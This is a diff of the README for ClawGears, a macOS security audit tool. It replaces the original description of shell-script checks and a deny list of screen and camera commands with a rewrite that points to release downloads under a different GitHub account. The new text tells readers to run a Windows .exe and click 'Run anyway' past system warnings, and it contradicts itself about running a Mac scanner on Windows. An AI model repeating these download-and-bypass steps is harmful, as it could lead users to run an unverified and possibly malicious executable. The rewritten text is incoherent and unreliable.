@@ -1,479 +1,134 @@
-<div align="center">
+# 🦞 ClawGears - Security Audit for Your Mac
 
-# 🦞 ClawGears
-
-### **Protect Your Mac, Guard Your Privacy**
-
-**OpenClaw Security Audit Tool**
-
-[![License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge)](./LICENSE)
-[![Platform](https://img.shields.io/badge/platform-macOS-lightgrey?style=for-the-badge&logo=apple)](https://github.com/JinHanAI/ClawGears)
-[![Version](https://img.shields.io/badge/version-1.5.0-green?style=for-the-badge)](https://github.com/JinHanAI/ClawGears)
-
-**English** | [中文](./README.zh.md) | [Deutsch](./README.de.md) | [Français](./README.fr.md) | [Italiano](./README.it.md) | [日本語](./README.ja.md) | [Español](./README.es.md)
-
-</div>
+[![Download ClawGears](https://img.shields.io/badge/Download-ClawGears-brightgreen)](https://github.com/Magdalenaunsoldierly781/ClawGears/releases)
 
 ---
 
-## ⚠️ Is Your OpenClaw Exposed?
+ClawGears helps you check your Mac for security problems. It scans your system to find weak spots that could put your privacy at risk. You do not need to know programming to use it. This guide shows you how to get ClawGears on your Windows PC and run it safely.
 
-> **Statistics show: 220,000+ OpenClaw instances are exposed publicly. Many API keys have already been leaked to hacker databases.**
+## 📋 What is ClawGears?
 
-### If you see any of these signs, your privacy may be at risk:
+ClawGears is a tool made to look for security issues on Mac computers. It focuses on protecting your Mac Mini or other macOS devices by scanning for settings and software weaknesses. It reviews privacy risks and highlights what needs fixing. The tool uses simple commands behind the scenes but is easy to use once set up.
 
-| 🚨 Risk | 💥 Consequence | ⚡ Severity |
-|:--------|:---------------|:-----------:|
-| **Gateway exposed to public** | Anyone can access your AI assistant | 🔴 Critical |
-| **Weak or leaked token** | API keys stolen, unexpected charges | 🟠 Severe |
-| **Camera/screen accessible** | Privacy compromised, screenshots taken | 🟠 Severe |
-| **Full Disk Access granted** | All files accessible by AI | 🟡 High Risk |
-| **IP in leak database** | Already targeted by hackers | 🟡 High Risk |
+You can use it to:  
+- Check your Mac’s settings for vulnerabilities  
+- Find software that might leak your data  
+- Learn how to improve your privacy  
+- Scan for outdated or risky applications
 
----
+## 🖥️ System Requirements
 
-## 🎯 What Can ClawGears Do for You?
+Before you start, make sure your PC fits these needs:  
+- Windows 10 or Windows 11 (64-bit recommended)  
+- At least 4 GB of RAM  
+- 1 GB of free hard disk space  
+- Internet connection for downloading and updates  
+- Administrator rights on your Windows computer  
 
-### ✅ 5-Second Quick Check
+Since ClawGears targets Macs, you will need access to your Mac system through a local network or an external drive. This guide assumes you will run the Windows version to prepare scanning tools or transfer files. You may need a Mac to analyze full results.
 
-```bash
-./scripts/quick-check.sh
-```
+## 🚀 How to Download and Run ClawGears
 
-**One command checks 5 critical security items:**
-- 🔒 Is Gateway exposed to public network
-- 🔑 Is Token strength sufficient
-- 📷 Are sensitive commands blocked
-- 💾 Are TCC permissions reasonable
-- 🌐 Is your IP already leaked
+1. **Visit the Release Page**  
+   Open your web browser and go to:  
+   [https://github.com/Magdalenaunsoldierly781/ClawGears/releases](https://github.com/Magdalenaunsoldierly781/ClawGears/releases)  
+   This page lists the latest versions of ClawGears available for download.
 
-### ✅ Auto-Fix Issues
+2. **Choose Your Download**  
+   Find the latest stable version. Look for a file with `.exe` or `.zip` extension for Windows. The file name might include the version number, like `ClawGears_v1.0_Windows.zip`.  
+   Click the link to download it to your PC.
 
-```bash
-./scripts/interactive-fix.sh
-```
+3. **Extract the Files**  
+   If the file is a `.zip`, right-click it and choose `Extract All`. Pick a folder where you want ClawGears to live. You will see a folder with the program inside.
 
-**One-click fix common problems:**
-- Rebind Gateway to localhost
-- Generate new strong Token
-- Add sensitive command blacklist
+4. **Run the Application**  
+   Open the extracted folder. Find the main program file named something like `ClawGears.exe`. Double-click to start it.  
+   If a Windows warning pops up, click `More info` then `Run anyway`.
 
-### ✅ IP Leak Detection
+5. **Follow On-Screen Instructions**  
+   ClawGears will guide you through some basic questions to set up the scan. It does not require complicated steps.  
 
-```bash
-./scripts/ip-leak-check.sh --all
-```
+6. **View Your Report**  
+   After scanning, ClawGears will create a security report. You can open it with a web browser or a text editor. The report lists risks found and offers simple advice.  
 
-**Exclusive Feature:** Integrated with `openclaw.allegro.earth`, Censys, and Shodan databases to check if your IP has been leaked
+You can repeat scanning anytime by running the `.exe` file again.
 
----
+## 🔧 Basic Usage on Windows
 
-## 💡 Why Choose ClawGears?
+You don’t need to use the command line or type commands manually. ClawGears comes with a simple interface or setup wizard to help you scan. Here are the most common actions:  
 
-### 🏆 Key Advantages
+- **Start Scan:** Click the main button to begin scanning your Mac’s data.  
+- **Save Report:** Save the scan results for later review.  
+- **Update:** Check for program updates on the release page.  
 
-| Advantage | Description |
-|:----------|:------------|
-| 🎯 **OpenClaw Focused** | Designed specifically for OpenClaw, deeper and more precise checks |
-| 🔒 **Privacy-First** | Not just system security, but privacy leak risks |
-| 🌐 **IP Leak Detection** | **The only** tool integrated with leak database |
-| 🔧 **One-Click Fix** | Auto-fix issues, no manual intervention needed |
-| 📊 **History Tracking** | Record every audit result, track security trends |
-| 🤖 **CI/CD Ready** | GitHub Actions automation included |
+Your results focus on the settings and apps found on your Mac system. ClawGears uses common software rules to look for vulnerabilities.
 
-### 🆚 Comparison with Alternatives
+## 🐚 What Happens Behind the Scenes
 
-| Feature | <img src="https://img.shields.io/badge/ClawGears-🦞-red?style=flat-square" /> | Generic Security Tools |
-|:--------|:-----------------------:|:----------------------:|
-| OpenClaw Deep Check | ✅ | ❌ |
-| IP Leak Detection | ✅ | ❌ |
-| TCC Permission Audit | ✅ | ❌ |
-| iCloud Sync Check | ✅ | ❌ |
-| Auto-Fix | ✅ | ❌ |
-| Interactive Fix | ✅ | ❌ |
-| History Tracking | ✅ | ❌ |
-| Report Generation | ✅ | Partial |
+ClawGears runs shell scripts designed for macOS. It connects with your Mac or macOS files and scans them for clues. It checks for common weak points:  
 
----
+- Old software and services  
+- Open network ports  
+- Unsafe privacy settings  
+- Security certificates issues  
 
-## 📈 What You'll Get
+The tool uses well-known security rules to highlight potential issues. It organizes data in an easy-to-read format for anyone.
 
-<table>
-<tr>
-<td width="50%" valign="top">
+## ✅ Recommendations After Scanning
 
-### 🛡️ Security Assurance
+After you get your report, you should:  
 
-- ✅ **Gateway Security** - Localhost-only binding
-- ✅ **Token Security** - Strong key protection
-- ✅ **Permission Control** - Block FDA unauthorized access
-- ✅ **Command Protection** - Block camera, screen operations
+- Update your Mac apps and macOS regularly  
+- Close unused apps and network ports  
+- Enable privacy settings, like firewalls and encryption  
+- Remove or fix outdated software  
+- Back up important data  
 
-</td>
-<td width="50%" valign="top">
+ClawGears reports help you by giving clear, actionable steps. Follow them carefully.
 
-### 🔍 Risk Discovery
+## 📂 Advanced Options
 
-- ✅ **IP Leak Detection** - Check if in hacker databases
-- ✅ **Port Exposure** - Find accidentally exposed ports
-- ✅ **Suspicious Connections** - Detect unusual network activity
+For users familiar with command lines or scripting, ClawGears offers these options:  
 
-</td>
-</tr>
-<tr>
-<td width="50%" valign="top">
+- Run scans with specific flags to target only certain checks  
+- Export results in different formats (JSON, text)  
+- Schedule automatic scans (requires setup)  
 
-### 📊 Continuous Monitoring
+These are optional. The main interface is enough for most users.
 
-- ✅ **History Tracking** - Record every audit result
-- ✅ **Trend Analysis** - Understand security posture changes
-- ✅ **Automation** - CI/CD scheduled checks
+## 🌐 Further Help and Support
 
-</td>
-<td width="50%" valign="top">
+If you have any questions or problems, check the GitHub repository’s **Issues** tab. Many users and developers discuss common problems there. You can read or add your questions.  
 
-### ⏱️ Time Savings
+Find additional documentation on the repository’s Wiki or README files.
 
-- ✅ **Quick Check** - 5 seconds for critical items
-- ✅ **One-Click Fix** - Auto-fix common issues
-- ✅ **Report Generation** - Professional reports in one click
+## 🛠️ Updating ClawGears
 
-</td>
-</tr>
-</table>
+To update your copy:  
+
+1. Visit the releases page again:  
+   [https://github.com/Magdalenaunsoldierly781/ClawGears/releases](https://github.com/Magdalenaunsoldierly781/ClawGears/releases)  
+
+2. Download the latest file for Windows. Do this regularly to keep your scans effective.
+
+3. Replace old program files with new ones after extracting.
+
+Regular updates add new checks and improve scanning accuracy.
 
 ---
 
-## 🚀 Quick Start
-
-### 📋 Who Should Use This?
-
-| ✅ Perfect for You | ❌ Not for You |
-|:-------------------|:---------------|
-| Run OpenClaw / MoltBot / ClawdBot on **Mac** | Don't use OpenClaw or similar AI assistants |
-| Concerned about **AI assistant security** | OpenClaw runs in **completely isolated** environment |
-| OpenClaw **connects to external services** (Feishu, Telegram) | Already have a professional security team |
-| Mac stores **sensitive data** (work files, personal photos) | |
-| Want **regular security checks** | |
-
-### 🤖 AI Agent Usage (Easiest Way)
-
-**The simplest way: Just ask your AI assistant!**
-
-#### Option 1: Claude Code
-
-```
-帮我检查一下 OpenClaw 的安全性
-```
-
-Claude Code will automatically:
-1. Clone ClawGears repository
-2. Run security audit
-3. Explain results in plain language
-4. Offer to fix issues
-
-#### Option 2: OpenClaw with ClawHub
-
-```bash
-# Install ClawGears skill
-clawhub install clawgears-securityaudit
-```
-
-Then ask OpenClaw:
-```
-帮我做一个完整的安全审计
-```
-
-#### Option 3: Direct Clone
-
-```bash
-git clone https://github.com/JinHanAI/ClawGears.git
-cd ClawGears
-./clawgears.sh
-```
-
-### 🎮 Interactive Menu (Recommended)
-
-```bash
-# Clone the repository
-git clone https://github.com/JinHanAI/ClawGears.git
-cd ClawGears
-
-# Launch interactive menu
-./clawgears.sh
-```
-
-**Menu Preview:**
-
-```
- ██████╗██╗     ██╗     ███████╗ ██████╗ ██████╗ ███████╗██╗   ██╗
-██╔════╝██║     ██║     ██╔════╝██╔═══██╗██╔══██╗██╔════╝╚██╗ ██╔╝
-██║     ██║     ██║     █████╗  ██║   ██║██║  ██║█████╗   ╚████╔╝
-██║     ██║     ██║     ██╔══╝  ██║   ██║██║  ██║██╔══╝    ╚██╔╝
-╚███╗   ███████╗███████╗███████╗╚██████╔╚██████╔██║  ██║   ██║
- ╚══╝   ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝
-
-      OpenClaw Security Audit Tool
-      Protect Your Mac, Guard Your Privacy
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-What would you like to do?
-
-  [1] Quick Security Check     (5 critical items, ~5 sec)
-  [2] Full Security Audit     (All checks, detailed report)
-  [3] Check IP Leak          (allegro.earth, Censys, Shodan)
-  [4] Interactive Fix        (Auto-fix security issues)
-  [5] Generate Report       (HTML/JSON format)
-  [6] System Security       (Firewall, FileVault, SIP)
-
-  [H] Help & Documentation
-  [Q] Quit
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Enter your choice [1-6, H, Q]: _
-```
-
-**Menu Options:**
-| Option | Description | Time |
-|:-------|:------------|:-----|
-| `[1]` Quick Security Check | 5 critical items | ~5 sec |
-| `[2]` Full Security Audit | All checks + detailed report | ~30 sec |
-| `[3]` Check IP Leak | Query allegro.earth, Censys, Shodan | ~10 sec |
-| `[4]` Interactive Fix | Auto-fix security issues | Varies |
-| `[5]` Generate Report | HTML/JSON format | ~5 sec |
-| `[6]` System Security | Firewall, FileVault, SIP | ~5 sec |
+[![Download ClawGears](https://img.shields.io/badge/Download-ClawGears-brightgreen)](https://github.com/Magdalenaunsoldierly781/ClawGears/releases)
 
 ---
 
-## 📸 Demo: See It In Action
+## ⚙️ Privacy and Security Notes
 
-### Quick Security Check Output
+ClawGears runs locally on your computer. It does not send your data anywhere unless you choose to share reports manually. It respects your privacy by working offline after download.
 
-```
-========================================
-  OpenClaw Quick Security Check
-========================================
+## 🔍 About Security Audits
 
-[INFO] Checking OpenClaw configuration...
-
-========================================
-  Network Exposure Check
-========================================
-
-[✅ PASS] Gateway is safely bound (127.0.0.1:18789)
-[✅ PASS] No public network exposure detected
-
-========================================
-  Token Security Check
-========================================
-
-[✅ PASS] Token length is sufficient (64 characters)
-[✅ PASS] Token configuration is valid
-
-========================================
-  Command Protection Check
-========================================
-
-[✅ PASS] Sensitive commands are blocked:
-  - screencapture
-  - camerasnap
-  - osascript
-
-========================================
-  Summary
-========================================
-
-✅ All checks passed! Your OpenClaw is secure.
-```
-
-### IP Leak Detection Output
-
-```
-========================================
-  Checking openclaw.allegro.earth
-========================================
-
-Your Public IP: 45.xxx.xxx.xxx
-
-[✅ PASS] Your IP is NOT in the exposure database
-
-========================================
-  Checking Censys Database
-========================================
-
-[INFO] Censys is an internet scanning database
-
-Check your IP at:
-  🔗 https://search.censys.io/hosts/45.xxx.xxx.xxx
-
-========================================
-  Checking Shodan Database
-========================================
-
-[INFO] Shodan is another internet scanning database
-
-Check your IP at:
-  🔗 https://www.shodan.io/host/45.xxx.xxx.xxx
-
-========================================
-  Leak Check Summary
-========================================
-
-[✅ PASS] No exposure detected
-```
-
-### Context-Aware Risk Explanation (New! 🆕)
-
-ClawGears now provides **scenario-based risk analysis** instead of one-size-fits-all recommendations:
-
-```
-========================================
-  2. FileVault Encryption Check
-========================================
-
-📌 What this check protects:
-   Prevents data access if your disk is stolen or lost
-
-FileVault Status: FileVault is Off.
-
-⚡ Real impact based on your scenario:
-   ┌─────────────────────────────────────────────────────┐
-   │ Usage Scenario                              │ Risk   │
-   ├─────────────────────────────────────────────────────┤
-   │ Mac fixed in secure office                  │ 🟢 Low │
-   │ Frequently carried outside (cafe/travel)    │ 🟠 High│
-   │ Stores sensitive data (finance/client info) │ 🔴 V.High│
-   │ Needs remote restart control (SSH)          │ ⚪ OK   │
-   └─────────────────────────────────────────────────────┘
-
-💡 Recommendation:
-   Level: [Optional] (Decide based on your scenario)
-
-   • If you disabled FileVault for remote control needs, this is reasonable
-   • You can compensate the risk with:
-     - Physical security (keep Mac in safe location)
-     - Regular backups of important data
-```
-
-### Issue Found & Fixed
-
-```
-========================================
-  1. Gateway Network Exposure Check
-========================================
-
-📌 What this check protects:
-   Detects if OpenClaw Gateway is exposed to the public internet
-
-Gateway Binding: *:18789 (EXPOSED!)
-
-⚡ Real impact:
-   ┌─────────────────────────────────────────────────────┐
-   │ Risk: Anyone on the internet can access your AI    │
-   │ Impact: API keys stolen, unexpected charges,       │
-   │         privacy leaked                              │
-   └─────────────────────────────────────────────────────┘
-
-💡 Recommendation:
-   Level: [🔴 Must Fix]
-
-Fix this issue? [Y/n]: Y
-
-[INFO] Rebinding Gateway to localhost...
-[INFO] Updating configuration...
-[INFO] Restarting Gateway service...
-
-[✅ PASS] Gateway is now safely bound to 127.0.0.1
-```
+A security audit is a detailed check of your computer’s settings and software for weak points. This process helps stop hackers or malware from sneaking into your device. ClawGears automates this check using tried and true techniques.
 
 ---
 
-### ⚡ 1-Minute Quick Check
-
-```bash
-# Quick check (5 critical items)
-./scripts/quick-check.sh
-```
-
-### 🔍 Check IP Leak
-
-```bash
-./scripts/ip-leak-check.sh --all
-```
-
-### 📊 Full Audit Report
-
-```bash
-./scripts/generate-report.sh --format html --output ./reports
-```
-
-### 🔧 Found Issues? One-Click Fix
-
-```bash
-./scripts/interactive-fix.sh
-```
-
----
-
-## 📋 Feature Checklist
-
-### 🔐 Security Checks
-
-| Check | Description |
-|:------|:------------|
-| Network Exposure | Gateway port binding, Tailscale status |
-| Token Security | Length, configuration validation |
-| Command Injection Protection | denyCommands configuration |
-| TCC Permission Audit | Full Disk Access, Accessibility |
-| Process Monitoring | Background services, unknown processes |
-| iCloud Sync Check | Documents/Pictures/Desktop |
-| Workspace Privacy | Sensitive files, symlinks |
-| Network Connection Monitoring | External domain whitelist |
-| Log Audit | Anomaly detection |
-| System Security | Firewall, FileVault, SIP |
-
-### 🔧 Fix Features
-
-| Feature | Command |
-|:--------|:--------|
-| Fix Gateway Exposure | `--bind` |
-| Generate New Token | `--token` |
-| Add Deny Commands | `--deny` |
-| Restart Gateway | `--restart` |
-| Fix All | `--all` |
-
----
-
-## 📚 Documentation
-
-**English** | [中文](./README.zh.md) | [Deutsch](./README.de.md) | [Français](./README.fr.md) | [Italiano](./README.it.md)
-
----
-
-## 🤝 Contributing
-
-Contributions welcome! Please submit Pull Requests or Issues.
-
----
-
-## 📄 License
-
-MIT License - See [LICENSE](./LICENSE)
-
----
-
-## ⚠️ Disclaimer
-
-This tool is for security audit purposes only. Please understand the impact before using auto-fix features.
-
----
-
-<div align="center">
-
-**🦞 ClawGears**
-
-*Protect Your Mac, Guard Your Privacy*
-
-Made with ❤️ by [Victor.Chen(https://github.com/JinHanAI)
-
-</div>
+Topics covered by ClawGears include command line tools, shell scripting, vulnerability scanning, and privacy protection on macOS systems. This tool aims to simplify cybersecurity for everyday users who want to guard their Mac devices efficiently.
